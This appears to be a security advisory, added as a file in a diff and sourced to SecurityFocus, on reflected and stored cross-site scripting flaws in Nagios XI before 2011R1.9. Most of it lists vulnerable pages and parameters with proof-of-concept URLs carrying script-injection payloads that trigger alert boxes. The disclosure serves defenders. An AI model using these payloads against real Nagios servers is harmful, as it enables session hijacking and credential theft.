@@ -1,0 +1,99 @@
+source: www.securityfocus.com/bid/51069/info
+
+Nagios XI is prone to an HTML injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user. Other attacks are also possible.
+
+Nagios XI versions prior to 2011R1.9 are vulnerable. 
+
+Reflected XSS
+-----
+
+Page:		/nagiosxi/login.php
+Variables:	-
+PoCs:		http://site/nagiosxi/login.php/";alert(&#039;0a29&#039;);"
+Details:	The URL is copied into JavaScript variable &#039;backend_url&#039; in an unsafe
+		manner
+		Also affects:
+		/nagiosxi/about/index.php
+		/nagiosxi/about/index.php
+		/nagiosxi/about/main.php
+		/nagiosxi/account/main.php
+		/nagiosxi/account/notifymethods.php
+		/nagiosxi/account/notifymsgs.php
+		/nagiosxi/account/notifyprefs.php
+		/nagiosxi/account/testnotification.php
+		/nagiosxi/help/index.php
+		/nagiosxi/help/main.php
+		/nagiosxi/includes/components/alertstream/go.php
+		/nagiosxi/includes/components/alertstream/index.php
+		/nagiosxi/includes/components/hypermap_replay/index.php
+		/nagiosxi/includes/components/massacknowledge/mass_ack.php
+		/nagiosxi/includes/components/xicore/recurringdowntime.php/
+		/nagiosxi/includes/components/xicore/status.php
+		/nagiosxi/includes/components/xicore/tac.php
+		/nagiosxi/reports/alertheatmap.php
+		/nagiosxi/reports/availability.php
+		/nagiosxi/reports/eventlog.php
+		/nagiosxi/reports/histogram.php
+		/nagiosxi/reports/index.php
+		/nagiosxi/reports/myreports.php
+		/nagiosxi/reports/nagioscorereports.php
+		/nagiosxi/reports/notifications.php
+		/nagiosxi/reports/statehistory.php
+		/nagiosxi/reports/topalertproducers.php
+		/nagiosxi/views/index.php
+		/nagiosxi/views/main.php
+
+Page:		/nagiosxi/account/
+Variables:	xiwindow
+PoCs:		http://site/nagiosxi/account/?xiwindow="></iframe><script>alert(&#039;0a29&#039;)</script>
+
+Page:		/nagiosxi/includes/components/massacknowledge/mass_ack.php
+Variables:	-
+PoCs:		http://site/nagiosxi/includes/components/massacknowledge/mass_ack.php/&#039;><script>alert("0a29")</script>
+
+Page:		/nagiosxi/includes/components/xicore/status.php
+Variables:	hostgroup, style
+PoCs:		http://site/nagiosxi/includes/components/xicore/status.php?show=hostgroups&hostgroup=&#039;><script>alert("0a29")</script>
+		http://site/nagiosxi/includes/components/xicore/status.php?show=hostgroups&hostgroup=all&style=><script>alert("0a29")</script>
+
+Page:		/nagiosxi/includes/components/xicore/recurringdowntime.php
+Variables:	-
+PoCs:		http://site/nagiosxi/includes/components/xicore/recurringdowntime.php/&#039;;}}alert(&#039;0a29&#039;)</script>
+
+
+Page:		/nagiosxi/reports/alertheatmap.php
+Variables:	height, host, service, width
+PoCs:		http://site/nagiosxi/reports/alertheatmap.php?height="><script>alert("0a29")</script>
+		http://site/nagiosxi/reports/alertheatmap.php?host="><script>alert("0a29")</script>
+		http://site/nagiosxi/reports/alertheatmap.php?service="><script>alert("0a29")</script>
+		http://site/nagiosxi/reports/alertheatmap.php?width="><script>alert("0a29")</script>
+
+Page:		/nagiosxi/reports/histogram.php
+Variable:	service
+PoCs:		http://site/nagiosxi/reports/histogram.php?service="><script>alert("0a29")</script>
+
+Page:		/nagiosxi/reports/notifications.php
+Variables:	host, service
+PoCs:		http://site/nagiosxi/reports/notifications.php?host="><script>alert("0a29")</script>
+		http://site/nagiosxi/reports/notifications.php?service="><script>alert("0a29")</script>
+
+Page:		/nagiosxi/reports/statehistory.php
+Variables:	host, service
+PoCs:		http://site/nagiosxi/reports/statehistory.php?host="><script>alert("0a29")</script>
+		http://site/nagiosxi/reports/statehistory.php?service="><script>alert("0a29")</script>
+
+
+Stored XSS
+-----
+
+Page:		/nagiosxi/reports/myreports.php
+Variable:	title
+Details:	It is possible to store XSS within &#039;My Reports&#039;, however it
+is believed this
+		is only viewable by the logged-in user.
+		1) View a report and save it, e.g.
+		http://site/nagiosxi/reports/myreports.php?add=1&title=Availability+Summary&url=%2Fnagiosxi%2Freports%2Favailability.php&meta_s=a%3A0%3A%7B%7D
+		2) Name the report with XSS, e.g. "><script>alert("0a29")</script>
+
